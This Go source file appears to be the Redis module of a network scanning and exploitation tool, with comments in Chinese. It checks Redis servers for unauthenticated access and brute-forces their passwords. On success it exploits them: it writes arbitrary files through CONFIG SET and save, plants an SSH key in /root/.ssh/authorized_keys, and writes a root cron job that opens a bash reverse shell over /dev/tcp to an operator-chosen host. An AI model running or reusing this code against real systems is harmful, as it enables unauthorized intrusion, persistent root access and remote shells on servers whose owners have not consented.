package Plugins

import (
	"bufio"
	"context"
	"fmt"
	"github.com/shadow1ng/fscan/Common"
	"io"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

var (
	dbfilename string // Redis数据库文件名
	dir        string // Redis数据库目录
)

type RedisCredential struct {
	Password string
}

type RedisScanResult struct {
	Success    bool
	IsUnauth   bool
	Error      error
	Credential RedisCredential
}

func RedisScan(info *Common.HostInfo) error {
	Common.LogDebug(fmt.Sprintf("开始Redis扫描: %s:%v", info.Host, info.Ports))

	// 设置全局超时上下文
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(Common.GlobalTimeout)*time.Second)
	defer cancel()

	target := fmt.Sprintf("%s:%v", info.Host, info.Ports)

	// 先尝试无密码连接
	resultChan := make(chan *RedisScanResult, 1)
	go func() {
		flag, err := RedisUnauth(ctx, info)
		if flag && err == nil {
			resultChan <- &RedisScanResult{
				Success:    true,
				IsUnauth:   true,
				Error:      nil,
				Credential: RedisCredential{Password: ""},
			}
			return
		}
		resultChan <- nil
	}()

	// 等待无密码连接结果或超时
	select {
	case result := <-resultChan:
		if result != nil && result.Success {
			Common.LogSuccess(fmt.Sprintf("Redis无密码连接成功: %s", target))

			// 保存未授权访问结果
			scanResult := &Common.ScanResult{
				Time:   time.Now(),
				Type:   Common.VULN,
				Target: info.Host,
				Status: "vulnerable",
				Details: map[string]interface{}{
					"port":    info.Ports,
					"service": "redis",
					"type":    "unauthorized",
				},
			}
			Common.SaveResult(scanResult)

			// 如果配置了写入功能，进行漏洞利用
			if Common.RedisFile != "" || Common.RedisShell != "" || (Common.RedisWritePath != "" && Common.RedisWriteContent != "") {
				conn, err := Common.WrapperTcpWithTimeout("tcp", target, time.Duration(Common.Timeout)*time.Second)
				if err == nil {
					defer conn.Close()
					ExploitRedis(ctx, info, conn, "")
				}
			}

			return nil
		}
	case <-ctx.Done():
		Common.LogError(fmt.Sprintf("Redis无密码连接测试超时: %s", target))
		return fmt.Errorf("全局超时")
	}

	if Common.DisableBrute {
		Common.LogDebug("暴力破解已禁用，结束扫描")
		return nil
	}

	// 使用密码爆破
	credentials := generateRedisCredentials(Common.Passwords)
	Common.LogDebug(fmt.Sprintf("开始尝试密码爆破 (总密码数: %d)", len(credentials)))

	// 使用工作池并发扫描
	result := concurrentRedisScan(ctx, info, credentials, Common.Timeout, Common.MaxRetries)
	if result != nil {
		// 记录成功结果
		Common.LogSuccess(fmt.Sprintf("Redis认证成功 %s [%s]", target, result.Credential.Password))

		// 保存弱密码结果
		scanResult := &Common.ScanResult{
			Time:   time.Now(),
			Type:   Common.VULN,
			Target: info.Host,
			Status: "vulnerable",
			Details: map[string]interface{}{
				"port":     info.Ports,
				"service":  "redis",
				"type":     "weak-password",
				"password": result.Credential.Password,
			},
		}
		Common.SaveResult(scanResult)

		// 如果配置了写入功能，进行漏洞利用
		if Common.RedisFile != "" || Common.RedisShell != "" || (Common.RedisWritePath != "" && Common.RedisWriteContent != "") {
			conn, err := Common.WrapperTcpWithTimeout("tcp", target, time.Duration(Common.Timeout)*time.Second)
			if err == nil {
				defer conn.Close()

				// 认证
				authCmd := fmt.Sprintf("auth %s\r\n", result.Credential.Password)
				conn.Write([]byte(authCmd))
				readreply(conn)

				ExploitRedis(ctx, info, conn, result.Credential.Password)
			}
		}

		return nil
	}

	// 检查是否因为全局超时
	select {
	case <-ctx.Done():
		Common.LogError(fmt.Sprintf("Redis扫描全局超时: %s", target))
		return fmt.Errorf("全局超时")
	default:
		Common.LogDebug(fmt.Sprintf("Redis扫描完成: %s", target))
		return nil
	}
}

// generateRedisCredentials 生成Redis密码列表
func generateRedisCredentials(passwords []string) []RedisCredential {
	var credentials []RedisCredential
	for _, pass := range passwords {
		actualPass := strings.Replace(pass, "{user}", "redis", -1)
		credentials = append(credentials, RedisCredential{
			Password: actualPass,
		})
	}
	return credentials
}

// concurrentRedisScan 并发扫描Redis服务
func concurrentRedisScan(ctx context.Context, info *Common.HostInfo, credentials []RedisCredential, timeoutMs int64, maxRetries int) *RedisScanResult {
	// 使用ModuleThreadNum控制并发数
	maxConcurrent := Common.ModuleThreadNum
	if maxConcurrent <= 0 {
		maxConcurrent = 10 // 默认值
	}
	if maxConcurrent > len(credentials) {
		maxConcurrent = len(credentials)
	}

	// 创建工作池
	var wg sync.WaitGroup
	resultChan := make(chan *RedisScanResult, 1)
	workChan := make(chan RedisCredential, maxConcurrent)
	scanCtx, scanCancel := context.WithCancel(ctx)
	defer scanCancel()

	// 启动工作协程
	for i := 0; i < maxConcurrent; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for credential := range workChan {
				select {
				case <-scanCtx.Done():
					return
				default:
					result := tryRedisCredential(scanCtx, info, credential, timeoutMs, maxRetries)
					if result.Success {
						select {
						case resultChan <- result:
							scanCancel() // 找到有效凭据，取消其他工作
						default:
						}
						return
					}
				}
			}
		}()
	}

	// 发送工作
	go func() {
		for i, cred := range credentials {
			select {
			case <-scanCtx.Done():
				break
			default:
				Common.LogDebug(fmt.Sprintf("[%d/%d] 尝试密码: %s", i+1, len(credentials), cred.Password))
				workChan <- cred
			}
		}
		close(workChan)
	}()

	// 等待结果或完成
	go func() {
		wg.Wait()
		close(resultChan)
	}()

	// 获取结果，考虑全局超时
	select {
	case result, ok := <-resultChan:
		if ok && result != nil && result.Success {
			return result
		}
		return nil
	case <-ctx.Done():
		Common.LogDebug("Redis并发扫描全局超时")
		scanCancel() // 确保取消所有未完成工作
		return nil
	}
}

// tryRedisCredential 尝试单个Redis凭据
func tryRedisCredential(ctx context.Context, info *Common.HostInfo, credential RedisCredential, timeoutMs int64, maxRetries int) *RedisScanResult {
	var lastErr error

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			return &RedisScanResult{
				Success:    false,
				Error:      fmt.Errorf("全局超时"),
				Credential: credential,
			}
		default:
			if retry > 0 {
				Common.LogDebug(fmt.Sprintf("第%d次重试密码: %s", retry+1, credential.Password))
				time.Sleep(500 * time.Millisecond) // 重试前等待
			}

			success, err := attemptRedisAuth(ctx, info, credential.Password, timeoutMs)
			if success {
				return &RedisScanResult{
					Success:    true,
					Credential: credential,
				}
			}

			lastErr = err
			if err != nil {
				// 检查是否需要重试
				if retryErr := Common.CheckErrs(err); retryErr == nil {
					break // 不需要重试的错误
				}
			}
		}
	}

	return &RedisScanResult{
		Success:    false,
		Error:      lastErr,
		Credential: credential,
	}
}

// attemptRedisAuth 尝试Redis认证
func attemptRedisAuth(ctx context.Context, info *Common.HostInfo, password string, timeoutMs int64) (bool, error) {
	// 创建独立于全局超时的单个连接超时上下文
	connCtx, cancel := context.WithTimeout(context.Background(), time.Duration(timeoutMs)*time.Millisecond)
	defer cancel()

	// 结合全局上下文和连接超时上下文
	mergedCtx, mergedCancel := context.WithCancel(connCtx)
	defer mergedCancel()

	// 监听全局上下文取消
	go func() {
		select {
		case <-ctx.Done():
			mergedCancel() // 全局超时会触发合并上下文取消
		case <-connCtx.Done():
			// 连接超时已经触发，无需操作
		}
	}()

	connChan := make(chan struct {
		success bool
		err     error
	}, 1)

	go func() {
		success, err := RedisConn(info, password)
		select {
		case <-mergedCtx.Done():
		case connChan <- struct {
			success bool
			err     error
		}{success, err}:
		}
	}()

	select {
	case result := <-connChan:
		return result.success, result.err
	case <-mergedCtx.Done():
		if ctx.Err() != nil {
			return false, fmt.Errorf("全局超时")
		}
		return false, fmt.Errorf("连接超时")
	}
}

// RedisUnauth 尝试Redis未授权访问检测
func RedisUnauth(ctx context.Context, info *Common.HostInfo) (flag bool, err error) {
	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
	Common.LogDebug(fmt.Sprintf("开始Redis未授权检测: %s", realhost))

	// 创建带超时的连接
	connCtx, cancel := context.WithTimeout(ctx, time.Duration(Common.Timeout)*time.Second)
	defer cancel()

	connChan := make(chan struct {
		conn net.Conn
		err  error
	}, 1)

	go func() {
		conn, err := Common.WrapperTcpWithTimeout("tcp", realhost, time.Duration(Common.Timeout)*time.Second)
		select {
		case <-connCtx.Done():
			if conn != nil {
				conn.Close()
			}
		case connChan <- struct {
			conn net.Conn
			err  error
		}{conn, err}:
		}
	}()

	var conn net.Conn
	select {
	case result := <-connChan:
		if result.err != nil {
			Common.LogError(fmt.Sprintf("Redis连接失败 %s: %v", realhost, result.err))
			return false, result.err
		}
		conn = result.conn
	case <-connCtx.Done():
		return false, fmt.Errorf("连接超时")
	}

	defer conn.Close()

	// 发送info命令测试未授权访问
	Common.LogDebug(fmt.Sprintf("发送info命令到: %s", realhost))
	if _, err = conn.Write([]byte("info\r\n")); err != nil {
		Common.LogError(fmt.Sprintf("Redis %s 发送命令失败: %v", realhost, err))
		return false, err
	}

	// 读取响应
	reply, err := readreply(conn)
	if err != nil {
		Common.LogError(fmt.Sprintf("Redis %s 读取响应失败: %v", realhost, err))
		return false, err
	}
	Common.LogDebug(fmt.Sprintf("收到响应，长度: %d", len(reply)))

	// 检查未授权访问
	if !strings.Contains(reply, "redis_version") {
		Common.LogDebug(fmt.Sprintf("Redis %s 未发现未授权访问", realhost))
		return false, nil
	}

	// 发现未授权访问，获取配置
	Common.LogDebug(fmt.Sprintf("Redis %s 发现未授权访问，尝试获取配置", realhost))
	dbfilename, dir, err = getconfig(conn)
	if err != nil {
		result := fmt.Sprintf("Redis %s 发现未授权访问", realhost)
		Common.LogSuccess(result)
		return true, err
	}

	// 输出详细信息
	result := fmt.Sprintf("Redis %s 发现未授权访问 文件位置:%s/%s", realhost, dir, dbfilename)
	Common.LogSuccess(result)
	return true, nil
}

// RedisConn 尝试Redis连接
func RedisConn(info *Common.HostInfo, pass string) (bool, error) {
	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
	Common.LogDebug(fmt.Sprintf("尝试Redis连接: %s [%s]", realhost, pass))

	// 建立TCP连接
	conn, err := Common.WrapperTcpWithTimeout("tcp", realhost, time.Duration(Common.Timeout)*time.Second)
	if err != nil {
		Common.LogDebug(fmt.Sprintf("连接失败: %v", err))
		return false, err
	}
	defer conn.Close()

	// 设置超时
	if err = conn.SetReadDeadline(time.Now().Add(time.Duration(Common.Timeout) * time.Second)); err != nil {
		Common.LogDebug(fmt.Sprintf("设置超时失败: %v", err))
		return false, err
	}

	// 发送认证命令
	authCmd := fmt.Sprintf("auth %s\r\n", pass)
	Common.LogDebug("发送认证命令")
	if _, err = conn.Write([]byte(authCmd)); err != nil {
		Common.LogDebug(fmt.Sprintf("发送认证命令失败: %v", err))
		return false, err
	}

	// 读取响应
	reply, err := readreply(conn)
	if err != nil {
		Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
		return false, err
	}
	Common.LogDebug(fmt.Sprintf("收到响应: %s", reply))

	// 认证成功
	if strings.Contains(reply, "+OK") {
		Common.LogDebug("认证成功，获取配置信息")

		// 获取配置信息
		dbfilename, dir, err = getconfig(conn)
		if err != nil {
			result := fmt.Sprintf("Redis认证成功 %s [%s]", realhost, pass)
			Common.LogSuccess(result)
			Common.LogDebug(fmt.Sprintf("获取配置失败: %v", err))
			return true, err
		}

		result := fmt.Sprintf("Redis认证成功 %s [%s] 文件位置:%s/%s",
			realhost, pass, dir, dbfilename)
		Common.LogSuccess(result)
		return true, nil
	}

	Common.LogDebug("认证失败")
	return false, fmt.Errorf("认证失败")
}

// ExploitRedis 执行Redis漏洞利用
func ExploitRedis(ctx context.Context, info *Common.HostInfo, conn net.Conn, password string) error {
	realhost := fmt.Sprintf("%s:%v", info.Host, info.Ports)
	Common.LogDebug(fmt.Sprintf("开始Redis漏洞利用: %s", realhost))

	// 如果配置为不进行测试则直接返回
	if Common.DisableRedis {
		Common.LogDebug("Redis漏洞利用已禁用")
		return nil
	}

	// 获取当前配置
	var err error
	if dbfilename == "" || dir == "" {
		dbfilename, dir, err = getconfig(conn)
		if err != nil {
			Common.LogError(fmt.Sprintf("获取Redis配置失败: %v", err))
			return err
		}
	}

	// 检查是否超时
	select {
	case <-ctx.Done():
		return fmt.Errorf("全局超时")
	default:
	}

	// 支持任意文件写入
	if Common.RedisWritePath != "" && Common.RedisWriteContent != "" {
		Common.LogDebug(fmt.Sprintf("尝试写入文件: %s", Common.RedisWritePath))

		// 提取目录和文件名
		filePath := Common.RedisWritePath
		dirPath := filepath.Dir(filePath)
		fileName := filepath.Base(filePath)

		Common.LogDebug(fmt.Sprintf("目标目录: %s, 文件名: %s", dirPath, fileName))

		success, msg, err := writeCustomFile(conn, dirPath, fileName, Common.RedisWriteContent)
		if err != nil {
			Common.LogError(fmt.Sprintf("文件写入失败: %v", err))
		} else if success {
			Common.LogSuccess(fmt.Sprintf("成功写入文件: %s", filePath))
		} else {
			Common.LogError(fmt.Sprintf("文件写入失败: %s", msg))
		}
	}

	// 支持从本地文件读取并写入
	if Common.RedisWritePath != "" && Common.RedisWriteFile != "" {
		Common.LogDebug(fmt.Sprintf("尝试从文件 %s 读取内容并写入到 %s", Common.RedisWriteFile, Common.RedisWritePath))

		// 读取本地文件内容
		fileContent, err := os.ReadFile(Common.RedisWriteFile)
		if err != nil {
			Common.LogError(fmt.Sprintf("读取本地文件失败: %v", err))
		} else {
			// 提取目录和文件名
			dirPath := filepath.Dir(Common.RedisWritePath)
			fileName := filepath.Base(Common.RedisWritePath)

			success, msg, err := writeCustomFile(conn, dirPath, fileName, string(fileContent))
			if err != nil {
				Common.LogError(fmt.Sprintf("文件写入失败: %v", err))
			} else if success {
				Common.LogSuccess(fmt.Sprintf("成功将文件 %s 的内容写入到 %s", Common.RedisWriteFile, Common.RedisWritePath))
			} else {
				Common.LogError(fmt.Sprintf("文件写入失败: %s", msg))
			}
		}
	}

	// 支持向SSH目录写入密钥（向后兼容）
	if Common.RedisFile != "" {
		Common.LogDebug(fmt.Sprintf("尝试写入SSH密钥: %s", Common.RedisFile))
		success, msg, err := writekey(conn, Common.RedisFile)
		if err != nil {
			Common.LogError(fmt.Sprintf("SSH密钥写入失败: %v", err))
		} else if success {
			Common.LogSuccess(fmt.Sprintf("SSH密钥写入成功"))
		} else {
			Common.LogError(fmt.Sprintf("SSH密钥写入失败: %s", msg))
		}
	}

	// 支持写入定时任务（向后兼容）
	if Common.RedisShell != "" {
		Common.LogDebug(fmt.Sprintf("尝试写入定时任务: %s", Common.RedisShell))
		success, msg, err := writecron(conn, Common.RedisShell)
		if err != nil {
			Common.LogError(fmt.Sprintf("定时任务写入失败: %v", err))
		} else if success {
			Common.LogSuccess(fmt.Sprintf("定时任务写入成功"))
		} else {
			Common.LogError(fmt.Sprintf("定时任务写入失败: %s", msg))
		}
	}

	// 恢复数据库配置
	Common.LogDebug("开始恢复数据库配置")
	if err = recoverdb(dbfilename, dir, conn); err != nil {
		Common.LogError(fmt.Sprintf("Redis %v 恢复数据库失败: %v", realhost, err))
	} else {
		Common.LogDebug("数据库配置恢复成功")
	}

	Common.LogDebug(fmt.Sprintf("Redis漏洞利用完成: %s", realhost))
	return nil
}

// writeCustomFile 向指定路径写入自定义内容
func writeCustomFile(conn net.Conn, dirPath, fileName, content string) (flag bool, text string, err error) {
	Common.LogDebug(fmt.Sprintf("开始向 %s/%s 写入内容", dirPath, fileName))
	flag = false

	// 设置文件目录
	Common.LogDebug(fmt.Sprintf("设置目录: %s", dirPath))
	if _, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir %s\r\n", dirPath))); err != nil {
		Common.LogDebug(fmt.Sprintf("设置目录失败: %v", err))
		return flag, text, err
	}
	if text, err = readreply(conn); err != nil {
		Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
		return flag, text, err
	}

	// 设置文件名
	if strings.Contains(text, "OK") {
		Common.LogDebug(fmt.Sprintf("设置文件名: %s", fileName))
		if _, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename %s\r\n", fileName))); err != nil {
			Common.LogDebug(fmt.Sprintf("设置文件名失败: %v", err))
			return flag, text, err
		}
		if text, err = readreply(conn); err != nil {
			Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
			return flag, text, err
		}

		// 写入内容
		if strings.Contains(text, "OK") {
			Common.LogDebug("写入文件内容")
			// 处理多行内容，添加换行符
			safeContent := strings.ReplaceAll(content, "\"", "\\\"")
			safeContent = strings.ReplaceAll(safeContent, "\n", "\\n")

			if _, err = conn.Write([]byte(fmt.Sprintf("set x \"%s\"\r\n", safeContent))); err != nil {
				Common.LogDebug(fmt.Sprintf("写入内容失败: %v", err))
				return flag, text, err
			}
			if text, err = readreply(conn); err != nil {
				Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
				return flag, text, err
			}

			// 保存更改
			if strings.Contains(text, "OK") {
				Common.LogDebug("保存更改")
				if _, err = conn.Write([]byte("save\r\n")); err != nil {
					Common.LogDebug(fmt.Sprintf("保存失败: %v", err))
					return flag, text, err
				}
				if text, err = readreply(conn); err != nil {
					Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
					return flag, text, err
				}
				if strings.Contains(text, "OK") {
					Common.LogDebug("文件写入成功")
					flag = true
				}
			}
		}
	}

	// 截断过长的响应文本
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		text = text[:50]
	}
	Common.LogDebug(fmt.Sprintf("写入文件完成, 状态: %v, 响应: %s", flag, text))
	return flag, text, err
}

// writekey 向Redis写入SSH密钥
func writekey(conn net.Conn, filename string) (flag bool, text string, err error) {
	Common.LogDebug(fmt.Sprintf("开始写入SSH密钥, 文件: %s", filename))
	flag = false

	// 设置文件目录为SSH目录
	Common.LogDebug("设置目录: /root/.ssh/")
	if _, err = conn.Write([]byte("CONFIG SET dir /root/.ssh/\r\n")); err != nil {
		Common.LogDebug(fmt.Sprintf("设置目录失败: %v", err))
		return flag, text, err
	}
	if text, err = readreply(conn); err != nil {
		Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
		return flag, text, err
	}

	// 设置文件名为authorized_keys
	if strings.Contains(text, "OK") {
		Common.LogDebug("设置文件名: authorized_keys")
		if _, err = conn.Write([]byte("CONFIG SET dbfilename authorized_keys\r\n")); err != nil {
			Common.LogDebug(fmt.Sprintf("设置文件名失败: %v", err))
			return flag, text, err
		}
		if text, err = readreply(conn); err != nil {
			Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
			return flag, text, err
		}

		// 读取并写入SSH密钥
		if strings.Contains(text, "OK") {
			// 读取密钥文件
			Common.LogDebug(fmt.Sprintf("读取密钥文件: %s", filename))
			key, err := Readfile(filename)
			if err != nil {
				text = fmt.Sprintf("读取密钥文件 %s 失败: %v", filename, err)
				Common.LogDebug(text)
				return flag, text, err
			}
			if len(key) == 0 {
				text = fmt.Sprintf("密钥文件 %s 为空", filename)
				Common.LogDebug(text)
				return flag, text, err
			}
			Common.LogDebug(fmt.Sprintf("密钥内容长度: %d", len(key)))

			// 写入密钥
			Common.LogDebug("写入密钥内容")
			if _, err = conn.Write([]byte(fmt.Sprintf("set x \"\\n\\n\\n%v\\n\\n\\n\"\r\n", key))); err != nil {
				Common.LogDebug(fmt.Sprintf("写入密钥失败: %v", err))
				return flag, text, err
			}
			if text, err = readreply(conn); err != nil {
				Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
				return flag, text, err
			}

			// 保存更改
			if strings.Contains(text, "OK") {
				Common.LogDebug("保存更改")
				if _, err = conn.Write([]byte("save\r\n")); err != nil {
					Common.LogDebug(fmt.Sprintf("保存失败: %v", err))
					return flag, text, err
				}
				if text, err = readreply(conn); err != nil {
					Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
					return flag, text, err
				}
				if strings.Contains(text, "OK") {
					Common.LogDebug("SSH密钥写入成功")
					flag = true
				}
			}
		}
	}

	// 截断过长的响应文本
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		text = text[:50]
	}
	Common.LogDebug(fmt.Sprintf("写入SSH密钥完成, 状态: %v, 响应: %s", flag, text))
	return flag, text, err
}

// writecron 向Redis写入定时任务
func writecron(conn net.Conn, host string) (flag bool, text string, err error) {
	Common.LogDebug(fmt.Sprintf("开始写入定时任务, 目标地址: %s", host))
	flag = false

	// 首先尝试Ubuntu系统的cron路径
	Common.LogDebug("尝试Ubuntu系统路径: /var/spool/cron/crontabs/")
	if _, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/crontabs/\r\n")); err != nil {
		Common.LogDebug(fmt.Sprintf("设置Ubuntu路径失败: %v", err))
		return flag, text, err
	}
	if text, err = readreply(conn); err != nil {
		Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
		return flag, text, err
	}

	// 如果Ubuntu路径失败，尝试CentOS系统的cron路径
	if !strings.Contains(text, "OK") {
		Common.LogDebug("尝试CentOS系统路径: /var/spool/cron/")
		if _, err = conn.Write([]byte("CONFIG SET dir /var/spool/cron/\r\n")); err != nil {
			Common.LogDebug(fmt.Sprintf("设置CentOS路径失败: %v", err))
			return flag, text, err
		}
		if text, err = readreply(conn); err != nil {
			Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
			return flag, text, err
		}
	}

	// 如果成功设置目录，继续后续操作
	if strings.Contains(text, "OK") {
		Common.LogDebug("成功设置cron目录")

		// 设置数据库文件名为root
		Common.LogDebug("设置文件名: root")
		if _, err = conn.Write([]byte("CONFIG SET dbfilename root\r\n")); err != nil {
			Common.LogDebug(fmt.Sprintf("设置文件名失败: %v", err))
			return flag, text, err
		}
		if text, err = readreply(conn); err != nil {
			Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
			return flag, text, err
		}

		if strings.Contains(text, "OK") {
			// 解析目标主机地址
			target := strings.Split(host, ":")
			if len(target) < 2 {
				Common.LogDebug(fmt.Sprintf("主机地址格式错误: %s", host))
				return flag, "主机地址格式错误", err
			}
			scanIp, scanPort := target[0], target[1]
			Common.LogDebug(fmt.Sprintf("目标地址解析: IP=%s, Port=%s", scanIp, scanPort))

			// 写入反弹shell的定时任务
			Common.LogDebug("写入定时任务")
			cronCmd := fmt.Sprintf("set xx \"\\n* * * * * bash -i >& /dev/tcp/%v/%v 0>&1\\n\"\r\n",
				scanIp, scanPort)
			if _, err = conn.Write([]byte(cronCmd)); err != nil {
				Common.LogDebug(fmt.Sprintf("写入定时任务失败: %v", err))
				return flag, text, err
			}
			if text, err = readreply(conn); err != nil {
				Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
				return flag, text, err
			}

			// 保存更改
			if strings.Contains(text, "OK") {
				Common.LogDebug("保存更改")
				if _, err = conn.Write([]byte("save\r\n")); err != nil {
					Common.LogDebug(fmt.Sprintf("保存失败: %v", err))
					return flag, text, err
				}
				if text, err = readreply(conn); err != nil {
					Common.LogDebug(fmt.Sprintf("读取响应失败: %v", err))
					return flag, text, err
				}
				if strings.Contains(text, "OK") {
					Common.LogDebug("定时任务写入成功")
					flag = true
				}
			}
		}
	}

	// 截断过长的响应文本
	text = strings.TrimSpace(text)
	if len(text) > 50 {
		text = text[:50]
	}
	Common.LogDebug(fmt.Sprintf("写入定时任务完成, 状态: %v, 响应: %s", flag, text))
	return flag, text, err
}

// Readfile 读取文件内容并返回第一个非空行
func Readfile(filename string) (string, error) {
	Common.LogDebug(fmt.Sprintf("读取文件: %s", filename))

	file, err := os.Open(filename)
	if err != nil {
		Common.LogDebug(fmt.Sprintf("打开文件失败: %v", err))
		return "", err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text != "" {
			Common.LogDebug("找到非空行")
			return text, nil
		}
	}
	Common.LogDebug("文件内容为空")
	return "", err
}

// readreply 读取Redis服务器响应
func readreply(conn net.Conn) (string, error) {
	Common.LogDebug("读取Redis响应")
	// 设置1秒读取超时
	conn.SetReadDeadline(time.Now().Add(time.Second))

	bytes, err := io.ReadAll(conn)
	if len(bytes) > 0 {
		Common.LogDebug(fmt.Sprintf("收到响应，长度: %d", len(bytes)))
		err = nil
	} else {
		Common.LogDebug("未收到响应数据")
	}
	return string(bytes), err
}

// getconfig 获取Redis配置信息
func getconfig(conn net.Conn) (dbfilename string, dir string, err error) {
	Common.LogDebug("开始获取Redis配置信息")

	// 获取数据库文件名
	Common.LogDebug("获取数据库文件名")
	if _, err = conn.Write([]byte("CONFIG GET dbfilename\r\n")); err != nil {
		Common.LogDebug(fmt.Sprintf("获取数据库文件名失败: %v", err))
		return
	}
	text, err := readreply(conn)
	if err != nil {
		Common.LogDebug(fmt.Sprintf("读取数据库文件名响应失败: %v", err))
		return
	}

	// 解析数据库文件名
	text1 := strings.Split(text, "\r\n")
	if len(text1) > 2 {
		dbfilename = text1[len(text1)-2]
	} else {
		dbfilename = text1[0]
	}
	Common.LogDebug(fmt.Sprintf("数据库文件名: %s", dbfilename))

	// 获取数据库目录
	Common.LogDebug("获取数据库目录")
	if _, err = conn.Write([]byte("CONFIG GET dir\r\n")); err != nil {
		Common.LogDebug(fmt.Sprintf("获取数据库目录失败: %v", err))
		return
	}
	text, err = readreply(conn)
	if err != nil {
		Common.LogDebug(fmt.Sprintf("读取数据库目录响应失败: %v", err))
		return
	}

	// 解析数据库目录
	text1 = strings.Split(text, "\r\n")
	if len(text1) > 2 {
		dir = text1[len(text1)-2]
	} else {
		dir = text1[0]
	}
	Common.LogDebug(fmt.Sprintf("数据库目录: %s", dir))

	return
}

// recoverdb 恢复Redis数据库配置
func recoverdb(dbfilename string, dir string, conn net.Conn) (err error) {
	Common.LogDebug("开始恢复Redis数据库配置")

	// 恢复数据库文件名
	Common.LogDebug(fmt.Sprintf("恢复数据库文件名: %s", dbfilename))
	if _, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename %s\r\n", dbfilename))); err != nil {
		Common.LogDebug(fmt.Sprintf("恢复数据库文件名失败: %v", err))
		return
	}
	if _, err = readreply(conn); err != nil {
		Common.LogDebug(fmt.Sprintf("读取恢复文件名响应失败: %v", err))
		return
	}

	// 恢复数据库目录
	Common.LogDebug(fmt.Sprintf("恢复数据库目录: %s", dir))
	if _, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir %s\r\n", dir))); err != nil {
		Common.LogDebug(fmt.Sprintf("恢复数据库目录失败: %v", err))
		return
	}
	if _, err = readreply(conn); err != nil {
		Common.LogDebug(fmt.Sprintf("读取恢复目录响应失败: %v", err))
		return
	}

	Common.LogDebug("数据库配置恢复完成")
	return
}
